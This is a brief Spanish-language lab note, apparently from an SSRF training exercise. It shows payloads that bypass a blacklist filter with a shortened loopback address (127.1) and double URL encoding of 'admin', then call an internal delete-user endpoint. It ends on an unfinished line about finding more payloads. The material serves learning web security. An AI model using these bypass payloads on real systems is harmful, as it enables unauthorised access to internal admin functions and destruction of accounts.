---
title: "4 - SSRF with blacklist-based input filter"
---

# 4 - SSRF with blacklist-based input filter

stockApi=http://127.1/%2561dmin

Le hacemos doble url encode a la a de admin y ==bypasseamos el filtro.==

stockApi=http://127.1/%2561dmin/delete?username=carlos


Por si acaso leer esto en busca de payloads:
